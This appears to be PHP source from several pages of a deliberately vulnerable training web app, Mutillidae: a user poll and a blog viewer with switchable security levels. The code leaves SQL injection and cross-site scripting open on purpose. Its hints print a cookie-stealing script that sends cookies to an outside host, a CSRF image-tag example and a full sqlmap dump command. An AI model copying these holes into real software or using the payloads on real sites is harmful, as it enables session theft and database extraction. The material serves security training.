							Defense: Web apps should not actual have access to any tables or other objects. Web apps should only have one privilege; EXECUTE.
							Even then, the web app should only be able to execute on one schema and that schema should only contain the procedures
							needed explicitly by the application. The procs will still have access to the tables in the table schema because
							databases run procs with the authroity of the owner; not the caller. It works as if the database sets the "suid" bit on procs. 
							Oracle and SQL Server do allow settings which alter this default behavior; for example causing the procs to run as the 
							caller. 
							</li>
							<li>MySQL information schema tables that would likely be useful to recon:
								<ul>
								<li>TABLES Table</li>
								<li>COLUMNS Table</li>
								<li>USER_PRIVILEGES Table</li>
								<li>ROUTINES Table</li>
								<li>VIEWS Table</li>
								<li>TRIGGERS Table</li>
								</ul>
							</li>
							<li>Attempt to recon what type of database is running then study the system functions, tables,
							and procedures that come with that platform. The built-in functions can come in handy.
							<li>
							<li>SQL Servers accept batch queries but MySQL and Oracle do not. However, Oracle is susceptable
							to all forms of SQL Injection all the same and provides the greatest number of system
							functions to exploit. MySQL has fewer functions but the ones provided are very useful.
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	
	if ($_SESSION["showhints"] == 2) {
		include_once './includes/sql-injection-tutorial.inc';
	}// end if	

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>
<?php
	/* Known Vulnerabilities: 
		Cross Site Scripting, 
		Cross Site Request Forgery,
		Application Exception Output,
		HTML injection,
		HTTP Parameter Pollution
	*/
		
	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lHTTPParameterPollutionDetected = FALSE;			
		break;
	    		
		case "2":
		case "3":
		case "4":
		case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;

			// Detect multiple params with same name (HTTP Parameter Pollution)
			$lQueryString  = explode('&', $_SERVER['QUERY_STRING']);
			$lKeys = array();
			$lPair = array();
			$lParameter = "";
			
			foreach ($lQueryString as $lParameter){
				$lPair = explode('=', $lParameter);
				array_push($lKeys, $lPair[0]);
			}

			$lCountUnique = count(array_unique($lKeys));
			$lCountTotal = count($lKeys);
			
			$lHTTPParameterPollutionDetected = ($lCountUnique < $lCountTotal);
			
   		break;
   	}// end switch		

   	$lUserChoiceMessage = "No choice selected";

   	if (!$lHTTPParameterPollutionDetected && isSet($_GET["user-poll-php-submit-button"])){
		try {

			$lUserChoiceMessage = "Your choice was {$_GET["choice"]}";
			
		} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, $query);
		}// end try
	}// end if isSet($_POST["user-poll-php-submit-button"])
?>

<div class="page-title">User Poll</div>

<?php include_once './includes/back-button.inc';?>

<fieldset>
	<legend>User Poll</legend>
	<form 	action="index.php" 
			method="GET"
			enctype="application/x-www-form-urlencoded" 
			id="idPollForm">
		<input type="hidden" name="page" value="user-poll.php" />
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-vote-tr" style="display: none;">
				<td class="error-message">
					Validation Error: HTTP Parameter Pollution Detected. Vote cannot be trusted.
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td id="id-poll-form-header-td" class="form-header">Choose Your Favorite Security Tool</td>
			</tr>
			<tr><td></td></tr>
			<tr><th class="label">Initial your choice to make your vote count</th></tr>
			<tr><td></td></tr>
			<tr>
				<td>
					<input name="choice" id="id_choice" type="radio" value="nmap" checked="checked" />&nbsp;&nbsp;nmap<br />
					<input name="choice" id="id_choice" type="radio" value="wireshark" />&nbsp;&nbsp;wireshark<br />
					<input name="choice" id="id_choice" type="radio" value="tcpdump" />&nbsp;&nbsp;tcpdump<br />
					<input name="choice" id="id_choice" type="radio" value="netcat" />&nbsp;&nbsp;netcat<br />
					<input name="choice" id="id_choice" type="radio" value="metasploit" />&nbsp;&nbsp;metasploit<br />
					<input name="choice" id="id_choice" type="radio" value="kismet" />&nbsp;&nbsp;kismet<br />
					<input name="choice" id="id_choice" type="radio" value="Cain" />&nbsp;&nbsp;Cain<br />
					<input name="choice" id="id_choice" type="radio" value="Ettercap" />&nbsp;&nbsp;Ettercap<br />
					<input name="choice" id="id_choice" type="radio" value="Paros" />&nbsp;&nbsp;Paros<br />
					<input name="choice" id="id_choice" type="radio" value="Burp Suite" />&nbsp;&nbsp;Burp Suite<br />
					<input name="choice" id="id_choice" type="radio" value="Sysinternals" />&nbsp;&nbsp;Sysinternals<br />
					<input name="choice" id="id_choice" type="radio" value="inSIDDer" />&nbsp;&nbsp;inSIDDer
				</td>
			</tr>
			<tr>
				<td class="label">
					Your Initials:<input type="text" name="initials" />
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td style="text-align:center;">
					<input name="user-poll-php-submit-button" class="button" type="submit" value="Submit Vote" />
				</td>
			</tr>
			<tr><td></td></tr>
			<tr><td></td></tr>
			<tr>
				<td class="report-header">
				<?php 
					if (!$lEncodeOutput){
						echo $lUserChoiceMessage; 
					}else{
						echo $Encoder->encodeForHTML($lUserChoiceMessage);
					}// end if 
				?>
				</td>
			</tr>
		</table>
	</form>
</fieldset>

<?php
	if ($lHTTPParameterPollutionDetected) {
		echo '<script>document.getElementById("id-bad-vote-tr").style.display="";</script>'; 
	}// end if ($lHTTPParameterPollutionDetected)
?>

<?php
	/* Display current user's choice */
	try {

	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try	
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li>
							  	HTTP Parameter Pollution involves sending in duplicate parameters 
							  	in order to take advantage of how the application server reacts to 
							  	parsing multiple parameters with the same name.
							</li>
						  	<li>
							  	Each brand of web application server acts a little different when 
							  	two or more parameters with the same name are submitted.
							</li>
							<li>This page implements "GET for POST" to make this exercise easier</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	
	if ($_SESSION["showhints"] == 2) {
		include_once './includes/http-parameter-pollution-tutorial.inc';
	}// end if
	
?>

<script type="text/javascript">
	try{
		document.getElementById("id_choice").focus();
	}catch(e){
		alert('Error trying to set focus on field choice: ' + e.message);
	}// end try
</script>
<?php
	/* Defined our constants to use to tokenize allowed HTML characters */
	include_once './includes/constants.php';


	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lTokenizeAllowedMarkup = FALSE;
			$lProtectAgainstSQLInjection = FALSE;
			break;
	    		
			case "2":
			case "3":
			case "4":
			case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/* Business Problem: Sometimes the business requirements define that users
			 * should be allowed to use some HTML  markup. If unneccesary, this is a
			 * bad idea. Output encoding will naturally kill any users attempt to use HTML
			 * in their input, which is exactly why we use output encoding. 
			 * 
			 * If the business process allows some HTML, then those HTML items are elevated
			 * from "mallicious input" to "direct object refernces" (a resource to be enjoyed).
			 * When we want to restrict a user to using to "direct object refernces" (a 
			 * resource to be enjoyed) responsibly, we use mapping. Mapping allows the user
			 * to chose from a "system generated" (that's us programmers) set of tokens
			 * to pick from. We need to assure that the user either chooses one of the tokens
			 * we offer, or our system rejects the request. To put it bluntly, either the user
			 * follows the rules, or their output is encoded. Period.
			 */
			$lTokenizeAllowedMarkup = TRUE;
			
			/* If we are in secure mode, we need to protect against SQLi */
			$lProtectAgainstSQLInjection = TRUE;
   		break;
   	}// end switch		
?>

<div class="page-title">View Blogs</div>

<?php include_once './includes/back-button.inc';?>

<fieldset>
	<legend>View Blog Entries</legend>
	<span>
		<a href="http://localhost/mutillidae/index.php?page=add-to-your-blog.php">
		<img style="vertical-align: middle;" src="./images/add_icon.png" height="32px" width="32px" />
		<span style="font-weight:bold; text-decoration: none;">Add To Your Blog</span>
		</a>
	</span>
	<form action="index.php?page=view-someones-blog.php" method="post" enctype="application/x-www-form-urlencoded">
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-blog-entry-tr" style="display: none;">
				<td class="error-message">
					Validation Error: Please choose blog entries to view
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td id="id-blog-form-header-td" class="form-header">Select Author and Click to View Blog</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td>
					<select name="author" id="id_author_select">
						<option value="53241E83-76EC-4920-AD6D-503DD2A6BA68">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please Choose Author&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
						<option value="6C57C4B5-B341-4539-977B-7ACB9D42985A">Show All</option>
						<?php
							try {
								$query  = "SELECT * FROM accounts";
								$result = $conn->query($query);
								if (!$result) {
							    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
							    }// end if							    
							    while($row = $result->fetch_object()){

									if(!$lEncodeOutput){
										$lUsername = $row->username;
									}else{
										$lUsername = $Encoder->encodeForHTML($row->username);
									}// end if
									
								    echo '<option value="' . $lUsername . '">' . $lUsername . '</option>\n';
									
								}// end while
							} catch (Exception $e) {
								echo $CustomErrorHandler->FormatError($e, $query);
							}// end try		
						?>
					</select>
					<input name="view-someones-blog-php-submit-button" class="button" type="submit" value="View Blog Entries" />
				</td>
			</tr>
			<tr><td></td></tr>
		</table>
	</form>
</fieldset>

<?php
	/* Known Vulnerabilities: 
		SQL injection, Cross Site Scripting, Cross Site Request Forgery
		Known Vulnerable Output: Name, Comment
	*/

	if(isSet($_POST["view-someones-blog-php-submit-button"])){
		try {

			/* Note that $conn->real_escape_string is ok but not the best defense. Stored
			 * Procedures are a much more powerful defense, run much faster, can be
			 * trapped in a schema, can run on the database, and can be called from
			 * any number of web applications. Stored procs are the true anti-pwn.
			 * There are 3 ways that stored procs can be made vulenrable by developers,
			 * but they are safe by default. Queries are vulnerable by default.
			 */
			if($lProtectAgainstSQLInjection){
				$lAuthor = $conn->real_escape_string($_POST["author"]);
			}else{
				$lAuthor = $_REQUEST["author"];
			}// end if

			if ($lAuthor == "53241E83-76EC-4920-AD6D-503DD2A6BA68" || strlen($lAuthor) == 0){
				echo '<script>document.getElementById("id-bad-blog-entry-tr").style.display="";</script>';
			}else{
				if ($lAuthor == "6C57C4B5-B341-4539-977B-7ACB9D42985A"){
					$lAuthor = "%";
				}// end if

				$query  = "SELECT * FROM blogs_table WHERE
							blogger_name like '{$lAuthor}'
							ORDER BY date DESC
							LIMIT 0 , 100";
							
				$result = $conn->query($query);
				if (!$result) {
			    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
			    }// end if

				/* Report Header */
				echo '<div>&nbsp;</div>';
				echo '<table border="1px" width="90%" class="main-table-frame">';
			    echo '
			    	<tr class="report-header">
			    		<td colspan="4">'.$result->num_rows.' Current Blog Entries</td>
			    	</tr>
			    	<tr class="report-header">
			    		<td>&nbsp;</td>
					    <td>Name</td>
					    <td>Date</td>
					    <td>Comment</td>
				    </tr>';

			    $lRowNumber = 0;
			    while($row = $result->fetch_object()){
			    	
			    	$lRowNumber++;
			    			    	
			    	/* Simple but effective security against XSS. Encode output per context if
					 * we are in secure-mode.
					 */
					if(!$lEncodeOutput){
						$lBloggerName = $row->blogger_name;
						$lDate = $row->date;
						$lComment = $row->comment;
					}else{
						$lBloggerName = $Encoder->encodeForHTML($row->blogger_name);
						$lDate = $Encoder->encodeForHTML($row->date);
						$lComment = $Encoder->encodeForHTML($row->comment);
					}// end if
			    	
					/* Some dangerous markup allowed. Here we restore the tokenized output. 
					 * Note that using GUIDs as tokens works well because they are 
					 * fairly unique plus they encode to the same value. 
					 * Encoding wont hurt them.
					 * 
					 * Note: Mutillidae is weird. It has to be broken and unbroken at the same time.
					 * Here we un-tokenize our output no matter if we are in secure mode or not.
					 */
					$lComment = str_ireplace(BOLD_STARTING_TAG, '<span style="font-weight:bold;">', $lComment);
					$lComment = str_ireplace(BOLD_ENDING_TAG, '</span>', $lComment);
					$lComment = str_ireplace(ITALIC_STARTING_TAG, '<span style="font-style: italic;">', $lComment);
					$lComment = str_ireplace(ITALIC_ENDING_TAG, '</span>', $lComment);
					$lComment = str_ireplace(UNDERLINE_STARTING_TAG, '<span style="border-bottom: 1px solid #000000;">', $lComment);
					$lComment = str_ireplace(UNDERLINE_ENDING_TAG, '</span>', $lComment);
										
					echo "<tr>
							<td>{$lRowNumber}</td>
							<td>{$lBloggerName}</td>
							<td>{$lDate}</td>
							<td>{$lComment}</td>
						</tr>\n";
				}//end while $row
				echo "</table>";		
			    		
			}// end if ($lAuthor == "53241E83-76EC-4920-AD6D-503DD2A6BA68" || strlen($lAuthor) == 0)		

		} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, $query);
		}// end try		
	}// end if isSet($_POST["view-someones-blog-php-submit-button"])
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off 
						  		both reflected (you see the results 
								instantly) and stored (someone can run across it 
								later in another app that uses the same database). 
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the 
								classic, but there are far more interesting things you 
								could do which I plan show in a video later.
							</li>
						  	<li>For some hot cookie stealing action, try something like:
								<pre>
&lt;script&gt;
	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
&lt;/script&gt;
								</pre>	
							</li>
							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may 
								allow you to get around some filters.
							</li>
							<li><b>For CSRF:</b>You can create another page someplace and
							make a link to an image that is not an image. You can also
							send someone an HTML email with a link inside. Sending links over
							HTML aware Instant Messaging like Communicator also works. One of the 
							quietest methods is to use HTML injection to poison a web page thus 
							creating a persistant attack. When a user visits the poisoned page, 
							their browser will reach out to the targe page. Using an AJAX request 
							can keep the rouge tranaction silent.
							You could use something like the following:
							<br>
							&lt;img src="http://localhost/mutillidae/index.php?page=add-to-your-blog.php&input_from_form=hi%20there%20monkeyboy"&gt;
							<br>
							This is the easy way to do CSRF with the GET method. Login 
							as someone, make your page with the link image someplace else, 
							and then view it. You should now see
							something new on the comment wall.
							</li>
							<li>
								For Cross Site Request Forgery, a tool like the Social
								Engineering Toolkit by Dave Kennedy can help. 
							</li>
						</ul>
					</td>
				</tr>
				<tr><td>&nbsp;</td></tr>
				<tr class="hint-body">
					<td class="hint-body">
						To use sqlmap, you need to know the page URL. We can get that by viewing requests and responses with HTTPFox, Paros, Burp, etc.
						<br/><br/>
						We decide whether to attack via GET or POST. sqlmap will automatically test URL query parameters supplied in the URL that you give. 
						To tell sqlmap about POST parameters, use the &quot;--data&quot; switch. Discover all the POST parameters 
						using a tool like Burp to make this part easy.
						<br/><br/>
						Use the sqlmap help. Type python sqlmap.py -h.
						<br/><br/>
						When your ready, string all this information together:
						<br/>
						python sqlmap.py --url=&quot;http://192.168.56.101/mutillidae/index.php?page=view-someones-blog.php&quot; --data=&quot;author=6C57C4B5-B341-4539-977B-7ACB9D42985A&amp;view-someones-blog-php-submit-button=View+Blog+Entries&quot; --level=1 --beep --dump</td>
				</tr>
				
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
	
	if ($_SESSION["showhints"] == 2) {
		include_once './includes/sql-injection.inc';
	}// end if	
?>